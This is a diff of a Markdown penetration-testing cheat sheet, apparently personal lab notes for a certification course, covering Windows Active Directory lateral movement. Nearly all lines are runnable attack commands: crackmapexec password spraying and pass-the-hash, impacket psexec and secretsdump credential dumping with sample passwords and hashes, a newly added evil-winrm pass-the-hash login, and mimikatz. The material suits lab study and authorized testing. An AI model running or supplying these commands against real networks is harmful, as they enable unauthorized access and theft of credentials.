@@ -105,13 +105,15 @@ Transfer loot back to kali:
 3. `crackmapexec smb 192.168.55.122 -u /home/kali/user1.txt -p CrabSharkJellyfish192 --continue-on-success` check if other users use the same password
 4. `psexec DOMAIN/username:SOMEPASSWORD@TARGETIP ` to login if sucessful
 5. E.G `python /usr/share/doc/python3-impacket/examples/psexec.py  offsec/Allison:'RockYou!'@192.168.125.59`
+
 ## Pass the Hash or crack(gained from local SAM)
 1. `impacket-secretsdump <username>:<password>@<domain name or IP> -dc-ip <DC IP>`
 2. or `secretsdump.py marvel/ID:SOMEPASSWORD@TARGETIP` eg `python /opt/impacket/examples/secretsdump.py offsec/Allison:'RockYou!'@192.168.125.59 `
 3. `crackmapexec smb 192.168.57.0/24 -u "Frank Admin" -H <Second part of the HASH without ::> --local-auth` (we are trying to login to other computers)
 4. If we pawned a PC, we can try to psexec into the PC. `psexec.py "Frank Admin":@TARGETIP -hashes avbcd:abcd`. 
 5. e.g `python /usr/share/doc/python3-impacket/examples/psexec.py  offsec/Administrator:@192.168.176.57 -hashes 51404eeaad3b435b51404ee:8c802621d74345dded890f3e5`
-6. If dont get a shell, we werent able to gain admin access. Maybe RDP is open?. We can still do Kerbroasting.
+6. `evil-winrm -i 192.168.160.170 -u SOMEUSER -H d098fa8675acd7d26ab86eb2581233e5``
+7. If dont get a shell, we werent able to gain admin access. Maybe RDP is open?. We can still do Kerbroasting.
 ## Dumping Hash (as Admin) 
 1. Use mimikatz to view, steal credentials, generate kerbros tickets and leverage attack.
 2. `.\mimikatz.exe`
